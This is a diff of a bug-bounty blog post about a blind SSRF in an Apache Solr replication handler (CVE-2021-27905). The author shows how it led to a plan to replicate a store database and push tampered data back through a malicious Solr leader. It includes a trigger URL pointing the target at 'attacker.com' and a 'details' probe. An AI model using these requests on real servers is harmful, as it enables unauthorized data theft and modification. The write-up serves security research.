@@ -15,20 +15,20 @@ header:
 
 This story begins last year, when I found three vulnerabilities in different Solr servers from a single private program. As already mentioned, some of these vulnerabilities are described in <a href="/posts/unrestricted-access-and-arbitrary-file-read-in-solr-endpoint">another post from this blog</a>. I really recommend reading it first, since it serves as an introduction to some Solr concepts that will be discussed here.
 
-During this time, I also found a blind SSRF in one of those Solr servers, which contained the front end data for all european stores of the company, such as product names, descriptions, image URLs, prices, sales, etc. It didn't contain any private information, so it was open and could be queried freely. Since the blind SSRF was not a high or critical severity bug, I didn't report it and decided to keep it to myself in case I could use it in the future as part of a more complex exploit chain. However, I ended up leaving this bug behind and moving on to some other projects.
+One of these Solr servers contained frontend data for all european stores of the company, such as product names, descriptions, prices, image URLs, sales, etc. It was open and could be queried freely, so it didn't contain any private data. Among other bugs, I found that it was vulnerable to a blind SSRF, which is was a known vulnerabilitiy identified as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27905">CVE-2021-27905</a>. However, since it was not a high or critical severity bug, I didn't report it and decided to keep it to myself in case I could use it in the future as part of a more complex exploit chain. In the end, I just left this behind and moved into some other unrelated project.
 
 Some months later (two weeks ago at the time of writing this post), I decided that I would like to spend more time doing bug bounties. I thought that it could be a good starting point to check all my previous notes for the vulnerabilities that I had reported in the past, in case something had changed. The goal was to get into the mood and to try preparing my mind to start hacking consistently, as I have found during my career that the mental aspect is the most difficult part for me when doing bug bounties.
 
-When I remembered that I had a blind SSRF in a program in which I had already found two high and one critical bugs, I knew that I had to take another look. However, this time I was going to take a more research-like approach and was decided to dig much deeper into Solr. I quickly verified that the blind SSRF was still exploitable and got into it.
+Now, with a more possitive perspective in mind, when I remembered that I had a blind SSRF in a program in which I had already found two high and one critical bugs, I knew that I had to take another look. However, this time I was going to take a more research-like approach and was decided to dig much deeper into Solr. I quickly verified that the blind SSRF was still exploitable and got right into it.
 
 
 [[ Understanding the blind SSRF ]]
 
-My first objective was to fully understand the blind SSRF vulnerability, since I originally found it by looking for common Solr vulnerabilities and didn't go any deeper. It is identified as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27905">CVE-2021-27905</a>, and was found in the replication handler of the Solr server, which was located at "/solr/&lt;core&gt;/replication". It could be triggered by visiting the following URL, where "en" is the name of one of the available Solr cores:
+My first objective was to fully understand the blind SSRF vulnerability, since I originally found it by looking for common Solr vulnerabilities and didn't go any deeper. As already mentioned it's knwon as <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-27905">CVE-2021-27905</a>, and is located in the replication handler of the Solr server, which in this case was at "/solr/&lt;core&gt;/replication". It could be triggered by visiting the following URL, where "en" is the name of one of the available Solr cores in the target server:
 
 <div class="code">https://target.com/solr/en/replication?command=fetchindex&leaderUrl=attacker.com</div>
 
-In order to learn more about the functionality involved in this bug, I needed to look at the Solr docs. Luckily, Apache maintains a huge web portal to host the Solr documentation, so it was not diffcult to find the <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/user-managed-index-replication.html">chapter related to Index Replication</a>. As I learnt, replication allows creating an infrastructure of several Solr instances in which a leader instance distributes copies of its data to the follower instances. The leader then manages updates to the data while the followers manage the querying.
+In order to learn more about all the functionalites involved in this bug, I needed to look at the Solr docs. Luckily, Apache maintains a huge web portal to host the Solr documentation, so it was not diffcult to find the <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/user-managed-index-replication.html">chapter related to Index Replication</a>. As I learnt, replication allows creating an infrastructure of several Solr instances in which a leader instance distributes copies of its data to the follower instances. The leader then manages updates to the data while the followers manage the querying.
 
 <img src="/assets/images/posts/2025-02-21/replication.png" style="width: 15em">
 
@@ -43,14 +43,20 @@ Each of the instances that participate in this infrastructure has an available r
   You can pass an extra attribute such as leaderUrl or compression (or any other parameter described in Configuring a Follower Server) to do a one time replication from a leader. This removes the need for hard-coding the leader URL in the follower configuration.
 </div>
 
-This meant that the Solr server in which I found the blind SSRF was a follower instance, for which a leader could be specified to perform a one time replication from it by using the "fetchindex" command. When I learnt about this, the first thing I thought was that maybe I could be able to create a malicious Solr server that acted as a leader and distribute a copy of my own data into the target server. Since the target Solr server acted as the database for all Europe stores of the company, this would mean that I would be able to modify the contents of all european stores of the company! This sounded great, but there was a long road ahead.
+This meant that the Solr server in which I found the blind SSRF was a follower instance, for which a leader could be specified to perform a one time replication from it by using the "fetchindex" command. When I learnt about this, the first thing I thought was that maybe I could be able to create a malicious Solr server that acted as a leader and distribute a copy of my own data into the target server. Since the target Solr server contained the data for all Europe stores of the company, this would mean that I would be able to modify the contents of these stores! This sounded great, but there was a long road ahead.
 
-Looking around, I also learnt about other replication commands, such as "details" which can be used to retrieve the replication configuration.
+Looking around, I also learnt about other replication commands, such as "details" which can be used to retrieve the replication configuration. In this case, it could be executed at the followin URL:
+
+<div class="code">https://target.com/solr/en/replication?command=details</div>
+
+The server sent back a huge JSON response that I didn't understand at the moment (also, I couldn't find any copy of this response when writing this post, since they have now restricted access to this endpoint and I didn't take enough screenshots lol). However, I learnt from this output that this server also allowed others to replicate data from it, meaning that I could download the entire database.
+
+This would be very useful, since, theoretically, I could just replicate the entire database, introduce a test enrty and then distribute it back to the target server. This way, the service wouldn't be interrupted in any way, but I could easily prove that I was able to modify the data by querying for the newly added entry.
+
+Great, the goal now was first to deplout a malicious Solr instance and check if I could replicate the database from the target server.
 
 
 [[ Creating my own Solr instance ]]
-
-The goal now was to deploy a malicious Solr instance that acted as a leader for the target Solr server and check if this malicious instance could serve custom data to it. Since this was a production environment, this process needed be as less destructive as possible. What I thought was to first replicate the data, then add a custom entry and then distribute the data back to the target server. This way, the service wouldn't be interrupted in any way, but I could easily prove that I was able to modify the data by querying for the newly added entry.
 
 So, I downloaded the latest binary release from the <a href="https://solr.apache.org/downloads.html">Solr webiste</a> and followed their <a href="https://solr.apache.org/guide/solr/latest/deployment-guide/installing-solr.html">deployment guide</a>. This binary release includes a command line interface tool that allows starting/stoping Solr, managing cores, basic configuration, etc. This way, Solr can be started on port 9000 with the following command:
 
